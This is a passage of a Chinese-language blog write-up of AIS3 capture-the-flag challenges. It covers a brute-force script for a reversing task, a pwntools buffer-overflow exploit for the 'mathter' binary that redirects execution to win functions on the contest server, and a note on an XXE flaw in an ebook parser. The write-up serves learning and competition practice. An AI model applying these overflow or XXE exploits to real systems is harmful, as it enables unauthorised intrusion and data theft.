+</span></span><span class=line><span class=cl>    sys.exit(1)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>cipher1=&#34;DHLIYJEG&#34;
+</span></span><span class=line><span class=cl>cipher2=&#34;MZRERYND&#34;
+</span></span><span class=line><span class=cl>cipher3=&#34;RUYODBAH&#34;
+</span></span><span class=line><span class=cl>cipher4=&#34;BKEMPBRE&#34;
+</span></span><span class=line><span class=cl>string1=&#39;&#39;
+</span></span><span class=line><span class=cl>string2=&#39;&#39;
+</span></span><span class=line><span class=cl>string3=&#39;&#39;
+</span></span><span class=line><span class=cl>string4=&#39;&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># 喔然後爆破的時候爆不出來，鬼轉 ida 把 爆破腳本的地方 改成 65 跟 90 就好了= = 
+</span></span><span class=line><span class=cl>for i in range(8):
+</span></span><span class=line><span class=cl>    for j in range(65,90):
+</span></span><span class=line><span class=cl>        if complex_function(j,i) == cipher1[i]:
+</span></span><span class=line><span class=cl>            string1+=chr(j)
+</span></span><span class=line><span class=cl>print(string1)
+</span></span><span class=line><span class=cl>for i in range(8):
+</span></span><span class=line><span class=cl>    for j in range(65,90):
+</span></span><span class=line><span class=cl>        if complex_function(j,i+0x20) == cipher2[i]:
+</span></span><span class=line><span class=cl>            string2+=chr(j)
+</span></span><span class=line><span class=cl>print(string2)
+</span></span><span class=line><span class=cl>for i in range(8):
+</span></span><span class=line><span class=cl>    for j in range(65,90):
+</span></span><span class=line><span class=cl>        if complex_function(j,i+0x40) == cipher3[i]:
+</span></span><span class=line><span class=cl>            string3+=chr(j)
+</span></span><span class=line><span class=cl>print(string3)
+</span></span><span class=line><span class=cl>for i in range(8):
+</span></span><span class=line><span class=cl>    for j in range(65,90):
+</span></span><span class=line><span class=cl>        if complex_function(j,i+0x60) == cipher4[i]:
+</span></span><span class=line><span class=cl>            string4+=chr(j)
+</span></span><span class=line><span class=cl>print(string4)
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/BJAbfjWVC.png loading=lazy alt=image></p><p>然後我們要用 gdb 去看 buffer 上面的數值，先 b scanf的前一個 (ni 去看)，丟完之後就 ni 到 xor 的地方，然後把 flag 組起來</p><p><img src=https://hackmd.io/_uploads/H1X7ViWN0.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/SkBdVjb4C.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/rJZ9NoZ40.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/Bko6VjbNR.png loading=lazy alt=image></p><p>flag: AIS3{G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!}</p><h2 id=pwn>pwn</h2><h3 id=mathter>mathter</h3><p>先看 main 長怎樣</p><p><img src=https://hackmd.io/_uploads/SkMzk-M4C.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/Bk-wJbGER.png loading=lazy alt=image></p><p>先去 calculator 看這個 func 在幹嘛，一開始想說這邊有 BOF 的問題，然後要寫在這上面，結果發現他會被這些判斷式卡住</p><p>然後就跑去看 goodbye 發現沒有什麼限制，然後在往他的 function表 去看的話會發現有兩個看起來很關鍵的 func (win1 win2)，上面會把值 print 出來，然後我們要開一個空間讓他 print</p><p><img src=https://hackmd.io/_uploads/rytikbzVR.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/Syzsvbf4A.png loading=lazy alt=image></p><p>這邊鬼轉 Ghidra 比較直觀xD</p><p><img src=https://hackmd.io/_uploads/HkuoPZz40.png loading=lazy alt=image></p><p>所以就開始寫 payloadㄌ ， 我們要寫 0x4 個 a 然後在 saved rbp 的部分蓋上一個可
+以寫東西的位置，因為如果直接把 saved rbp 也一起蓋的話，我們在 call win1 和 win2的時候會整個爛掉 (被這個卡了好幾個小時= =)</p><p><img src=https://hackmd.io/_uploads/HyIYUbM40.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/H1fxYbGV0.png loading=lazy alt=image></p><p>我們可以把值寫到 0x4bc520 的地方，然後再跳到 win1 和 win2 的 func ，我們觀察win1 跟 win2 會發現他會先判斷參數是否有等於他規定的，但我們可以直接跳過那個限制</p><p><img src=https://hackmd.io/_uploads/HkzQ_bfVC.png loading=lazy alt=image>
+<img src=https://hackmd.io/_uploads/rJwfFbGVC.png loading=lazy alt=image></p><p>solve.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># python3
+</span></span><span class=line><span class=cl>from pwn import *
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>#r=process(&#39;./mathter&#39;)
+</span></span><span class=line><span class=cl>r=remote(&#34;chals1.ais3.org&#34;,50001)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>r.sendlineafter(b&#39;:&#39;,b&#39;q&#39;)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>r.send(b&#39;a&#39;*4+p64(0x4bc140)+p64(0x004018e6)) #flag1
+</span></span><span class=line><span class=cl>#r.send(b&#39;a&#39;*4+p64(0x4bc140)+p64(0x004019b8)) # flag2
+</span></span><span class=line><span class=cl>#raw_input()
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>r.interactive()
+</span></span></code></pre></td></tr></table></div></div><p>flag: AIS3{0mg_k4zm4_mu57_b3_k1dd1ng_m3_2e89c9}</p><h1 id=賽後解-自用>賽後解 (自用)</h1><p>Ebook Parser</p><p>這題其實是 XXE 的漏洞，其實賽中的時候有想到，因為我在上傳 zip 檔的時候他會報一些 xml 的 error，但是最後覺得不太會考這種冷門的東西所以就略過他了QQ，然後也沒有想到 fb2 這種檔案格式</p><p><img src=https://hackmd.io/_uploads/rk5kVQMER.png loading=lazy alt=image></p><p>至於 payload 可以參考這一篇 issue</p><p><a class=link href=https://github.com/dnkorpushov/ebookmeta/issues/16 target=_blank rel=noopener>https://github.com/dnkorpushov/ebookmeta/issues/16</a></p><p><img src=https://hackmd.io/_uploads/BJIT4QMEC.png loading=lazy alt=image></p><p>flag: AIS3{LP#1742885: lxml no longer expands external entities (XXE) by default}</p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/thjcc-misc-%E9%83%A8%E5%88%86%E5%AE%98%E6%96%B9%E8%A9%B3%E8%A7%A3/><div class=article-image><img src=/p/thjcc-misc-%E9%83%A8%E5%88%86%E5%AE%98%E6%96%B9%E8%A9%B3%E8%A7%A3/cover.0acfc6238fd965ea48544b15dc3239e0_huafcfc5160927d37a0aac3b29e0bf4548_70698_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post THJCC Misc 部分官方詳解" data-key="THJCC Misc 部分官方詳解" data-hash="md5-Cs/GI4/ZZepIVEsV3DI54A=="></div><div class=article-details><h2 class=article-title>THJCC Misc 部分官方詳解</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2024 dkri3c1's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.21.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
